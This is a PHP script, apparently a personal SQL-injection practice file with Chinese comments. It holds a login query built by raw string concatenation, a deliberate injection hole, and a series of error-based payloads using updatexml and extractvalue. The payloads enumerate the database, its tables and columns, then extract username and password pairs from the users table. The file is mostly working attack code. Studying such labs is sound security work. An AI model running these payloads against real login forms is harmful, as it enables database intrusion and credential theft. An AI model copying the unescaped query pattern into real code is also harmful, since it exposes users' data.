<?php

$c = mysqli_connect("127.0.0.1", "root", "root", "xiaoxiaoran");

$name = "admin";
$pwd = "admin";


//查看当前数据库
$name = "admi' or extractvalue(1, concat('~',(  select database()  ))) -- +";
$name = "admi' or updatexml(1, concat('~',(  select database()  )),1) -- +";

//只显示32位
$name = "admi' or updatexml(1, concat('~',(  select group_concat(table_name) from information_schema.tables where table_schema='xiaoxiaoran' )),1) -- +";

//查看库所有的表
$name = "admi' or updatexml(1, concat('~',(  select table_name from information_schema.tables where table_schema='xiaoxiaoran' limit 0,1  )),1) -- +";
$name = "admi' or updatexml(1, concat('~',(  select table_name from information_schema.tables where table_schema='xiaoxiaoran' limit 1,1  )),1) -- +";
$name = "admi' or updatexml(1, concat('~',(  select table_name from information_schema.tables where table_schema='xiaoxiaoran' limit 14,1  )),1) -- +";
//查看表中所有的列
$name = "admi' or updatexml(1, concat('~',(  select column_name from information_schema.columns where table_name='users' limit 0,1    )),1) -- +";
$name = "admi' or updatexml(1, concat('~',(  select column_name from information_schema.columns where table_name='users' limit 12,1    )),1) -- +";

//查看表中user,password
$name = "admi' or updatexml(1, concat('~',(  select concat(username,' ',password) from users limit 0,1  )),1) -- +";
$name = "admi' or updatexml(1, concat('~',(  select concat(username,' ',password) from users limit 1,1  )),1) -- +";


$sql = "select username,password from users where username='$name' and password='$pwd'";

// echo $sql . "\n";

$result = mysqli_query($c, $sql);

if (mysqli_errno($c))
   exit(mysqli_error($c));

$row = @mysqli_num_rows($result);

if ($row)
   echo "ok" . "\n";
else
   echo "no" . "\n";
